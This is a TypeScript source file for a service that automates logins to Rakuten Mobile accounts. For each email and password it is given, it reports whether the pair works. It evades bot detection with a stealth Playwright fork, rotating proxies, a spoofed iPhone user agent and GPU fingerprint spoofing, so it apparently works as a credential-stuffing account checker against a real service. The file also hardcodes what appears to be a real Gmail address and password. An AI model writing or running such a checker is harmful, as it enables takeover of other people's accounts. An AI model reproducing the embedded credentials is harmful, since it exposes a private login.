import { chromium } from "patchright";
import IVerifyService from "../../application/ports/IVerifyService";
import { Credential } from "../../core/entities/Credential";
import UserAgent from "user-agents"
import { sleep, IPhoneDevice, createGPUSpoofScript } from "../../utils";
import { Page, devices } from "patchright";
import IProxyRepository from "../../core/repositories/IProxyRepository";

const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?r10_required_claims=r10_name&r10_audience=rae&r10_guest_login=true&r10_jid_service_id=rm001&scope=openid+memberinfo_read_safebulk+memberinfo_read_point+memberinfo_get_card_token+1Hour%40Access+90days%40Refresh&response_type=code&redirect_uri=https%3A%2F%2Fportal.mobile.rakuten.co.jp%2Fauth%2Fcallback&state=redirect_uri%3Dhttps%253A%252F%252Fportal.mobile.rakuten.co.jp%252Fdashboard%26operation%3Dlogin&client_id=rmn_app_web#/sign_in';
const TEST_ACCOUNT = {
  email: 's13301700128@gmail.com',
  password: 'hika3ta5900'
}

export default class PlaywrightVerify implements IVerifyService {
  // Default device type - change this to switch between devices
  private deviceType: IPhoneDevice = 'iphone-13';

  constructor(private readonly proxyRepository: IProxyRepository) {}

  /**
   * Set the iPhone device type for GPU spoofing
   * Available: iphone-11, iphone-12, iphone-12-pro, iphone-13, iphone-13-pro,
   *            iphone-13-pro-max, iphone-14, iphone-14-pro, iphone-14-pro-max,
   *            iphone-15, iphone-15-pro, iphone-15-pro-max, custom
   */
  private setDeviceType(device: IPhoneDevice): void {
    this.deviceType = device;
  }

  async verify(credential: Credential): Promise<boolean> {
    if (credential.password.length < 8) {
      return false;
    }

    const isDebug = process.env.AUTOMATE_DEBUG === 'true'

    const userAgentData = new UserAgent({
      deviceCategory: 'mobile',
      platform: 'iPhone'
    })

    const proxy = await this.proxyRepository.rotate();

    const browser = await chromium.launch({
      channel: "chrome",
      headless: false,
      args: [
        '--no-sandbox',
        '--disable-blink-features=AutomationControlled',
        '--hide-scrollbars',
        '--disable-infobars',
        '--window-position=0,0',
        '--ignore-certificate-errors',
        '--disable-gpu-shader-disk-cache',
      ],
      proxy: proxy ? {
        server: proxy.server,
        username: proxy.username ?? void 0,
        password: proxy.password ?? void 0
      } : void 0
    });

    const context = await browser.newContext({
      viewport: { width: 390, height: 844 },
      deviceScaleFactor: 3,
      isMobile: true,
      hasTouch: true,
      locale: "en-US",
      timezoneId: "Asia/Bangkok",
    });

    const page = await context.newPage();

    // Apply GPU spoofing based on device type
    // await this.applyGPUSpoofing(page);

    const client = await context.newCDPSession(page);

    await client.send('Emulation.setUserAgentOverride', {
      userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
      platform: "iPhone",
      acceptLanguage: "en-US",
      userAgentMetadata: {
        mobile: true,
        platform: "iOS",
        platformVersion: "16.6",
        architecture: "",
        model: "iPhone 13",
        brands: [
          { brand: "Apple", version: "16" },
          { brand: "Chromium", version: "119" }
        ]
      }
    });

    // await client.send('Emulation.setTouchEmulationEnabled', {
    //     enabled: true,
    //     maxTouchPoints: 5, // Ép cứng số điểm chạm là 5
    // });

    // await client.send('Emulation.setHardwareConcurrencyOverride', {
    //     hardwareConcurrency: 6,
    // });

    // if (isDebug) {
    //   await sleep(1000000000)
    // }

    try {
      await page.goto(LOGIN_URL);
      await page.waitForLoadState('networkidle');

      await page.locator('#user_id').fill(isDebug ? TEST_ACCOUNT.email : credential.email);
      const nextButton1 = await page.locator('[class*="button__submit"]').first();
      await nextButton1.waitFor({ state: 'visible', timeout: 5000 });
      await nextButton1.click();
      await page.waitForLoadState('networkidle');

    if (isDebug) {
      await sleep(1000000000)
    }

      await page.waitForURL('**/sign_in/password');
      await page.locator('#password_current').fill(isDebug ? TEST_ACCOUNT.password : credential.password);
      await page.waitForLoadState('networkidle');
      await page.waitForTimeout(1000)

      const nextButton = await page.locator('[class*="button__submit"]').nth(1);

      await nextButton.waitFor({ state: 'visible', timeout: 5000 });

      const loginResponsePromise = page.waitForResponse(response =>
        response.url().includes('/v2/login/complete') &&
        response.request().method() === 'POST'
      );

      await nextButton.click()

      // if (isDebug) {
      //   await sleep(1000000000)
      // }

      const loginResponse = await loginResponsePromise
      if (loginResponse.status() !== 200) {
        return false
      }

      const isDataUsageBoxVisible = await this.checkDataUsageBox(page);
      if (!isDataUsageBoxVisible) {
        return false;
      }

      const isVerified = await this.checkDataUsageBox(page)

      return isVerified
    } catch (e) {
      console.error(e)
      return false;
    } finally {
      await context.close();
      await browser.close();
    }
  }

  private async checkDataUsageBox(page: Page, retryCount: number = 0): Promise<boolean> {
    const dataUsageBox = page.locator('rktn-home-data-usage[itemid="d_home_2"]');

    try {
      console.log(`Checking Data Usage Box (Attempt ${retryCount + 1})...`);
      await dataUsageBox.waitFor({ state: 'visible', timeout: 15000 });
      return true;
    } catch (e) {
      if (retryCount < 3) {
        console.log("Element not found, reloading page...");

        if (page.url().includes('dashboard')) {
            await page.reload({ waitUntil: 'domcontentloaded' });
            await page.waitForTimeout(3000);
            return this.checkDataUsageBox(page, retryCount + 1);
        }
      }
      return false;
    }
  }

  /**
   * Apply GPU spoofing to the page based on the current device type
   * This overrides WebGL fingerprinting to match the selected iPhone device
   */
  private async applyGPUSpoofing(page: Page): Promise<void> {
    const spoofScript = createGPUSpoofScript(this.deviceType);
    await page.addInitScript(spoofScript);
    console.log(`[GPU Spoofing] Applied for device: ${this.deviceType}`);
  }
}
